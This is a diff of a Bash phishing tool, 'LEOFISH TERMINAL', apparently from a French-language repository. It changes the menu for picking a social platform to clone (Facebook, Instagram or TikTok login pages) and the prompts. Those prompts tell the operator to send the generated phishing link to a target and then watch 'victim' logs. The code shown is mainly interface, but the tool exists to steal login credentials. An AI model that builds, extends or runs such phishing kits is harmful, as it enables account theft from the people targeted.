@@ -34,8 +34,8 @@ show_banner() {
     fi
     echo -e "${NC}"
     echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0                         ${WHITE}║${NC}"
-    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring                    ${WHITE}║${NC}"
+    echo -e "${WHITE}║${YELLOW}                    LEOFISH TERMINAL v1.0            ${WHITE}║${NC}"
+    echo -e "${WHITE}║${GREEN}                    Victim → Hacker Monitoring        ${WHITE}║${NC}"
     echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
 }
@@ -49,23 +49,23 @@ generate_campaign() {
     echo ""
     
     # Sélection de la plateforme
-    echo -e "${WHITE}Choisissez la plateforme à cloner :${NC}"
-    echo -e "  ${GREEN}a${NC}  Facebook"
-    echo -e "  ${GREEN}b${NC}  Instagram"
-    echo -e "  ${GREEN}c${NC}  TikTok"
+    echo -e "${WHITE}Choisissez la plateforme à faire attaque :${NC}"
+    echo -e "  ${GREEN}1)${NC}  Facebook"
+    echo -e "  ${GREEN}2)${NC}  Instagram"
+    echo -e "  ${GREEN}3)${NC}  TikTok"
     echo ""
-    read -rp "$(echo -e "${WHITE}Votre choix (a/b/c) : ${NC}")" platform_choice
+    read -rp "$(echo -e "${WHITE}Votre choix (1/2/3) : ${NC}")" platform_choice
 
     case $platform_choice in
-        a|A)
+        1|1)
             PLATFORM="facebook"
             PAGE="index.php"
             ;;
-        b|B)
+        2|2)
             PLATFORM="instagram"
             PAGE="instagramlogin.php"
             ;;
-        c|C)
+        3|3)
             PLATFORM="tiktok"
             PAGE="tiktoklogin.php"
             ;;
@@ -103,7 +103,7 @@ generate_campaign() {
     echo -e "${GREEN}║  ${CYAN}${PHISH_LINK}${NC}"
     echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════╝${NC}"
     echo ""
-    echo -e "${YELLOW}📤 Copie ce lien et envoie-le à la cible${NC}"
+    echo -e "${YELLOW}📤 Copie iyo link uyihe umuntu ushaka guhakinga${NC}"
     echo -e "${PURPLE}⏳ Dès que la cible l'ouvre, les logs apparaîtront ici${NC}"
     echo ""
     read -rp "$(echo -e "${WHITE}Appuie sur Entrée pour démarrer le monitoring...${NC}")"
